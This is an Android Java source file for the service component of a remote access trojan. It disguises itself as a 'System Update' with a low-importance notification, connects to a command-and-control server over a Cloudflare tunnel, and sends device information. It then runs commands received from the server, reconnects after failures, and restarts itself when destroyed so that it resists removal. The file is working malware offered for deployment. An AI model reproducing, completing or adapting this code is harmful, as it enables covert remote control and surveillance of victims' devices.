package com.sysupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class RatService extends Service {
    public static final String TAG = "SysUpdate";

    // *** CHANGE THIS TO YOUR CLOUDFLARED URL ***
    // Example: "wss://random-words-1234.trycloudflare.com/"
    public static final String C2_URL = "wss://wear-utah-buffalo-latest.trycloudflare.com/";

    private static final String CH_ID = "sys_update_ch";
    private static final int NOTIF_ID = 4111;

    private OkHttpClient client;
    private WebSocket ws;
    private boolean running = true;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundCompat();
        client = new OkHttpClient.Builder()
                .pingInterval(20, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .build();
        connect();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void startForegroundCompat() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System Update", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification n = (Build.VERSION.SDK_INT >= 26)
                ? new Notification.Builder(this, CH_ID).setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build()
                : new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build();
        startForeground(NOTIF_ID, n);
    }

    private void connect() {
        Request req = new Request.Builder().url(C2_URL).build();
        ws = client.newWebSocket(req, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.d(TAG, "ws open");
                try {
                    JSONObject hello = new JSONObject();
                    hello.put("type", "hello");
                    hello.put("info", CommandHandler.deviceInfo(RatService.this));
                    webSocket.send(hello.toString());
                } catch (Exception e) {
                    Log.e(TAG, "hello fail", e);
                }
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                try {
                    JSONObject obj = new JSONObject(text);
                    String cmd = obj.optString("cmd");
                    String arg = obj.optString("arg", null);
                    Log.d(TAG, "cmd: " + cmd + " arg=" + arg);
                    CommandHandler.dispatch(RatService.this, webSocket, cmd, arg);
                } catch (Exception e) {
                    Log.e(TAG, "parse fail", e);
                }
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "ws fail: " + t.getMessage());
                scheduleReconnect();
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "ws closed: " + reason);
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!running) return;
        handler.postDelayed(() -> {
            try {
                if (ws != null) ws.cancel();
            } catch (Exception ignored) {}
            connect();
        }, 8000);
    }

    @Override
    public void onDestroy() {
        running = false;
        try { if (ws != null) ws.close(1000, "bye"); } catch (Exception ignored) {}
        Intent i = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}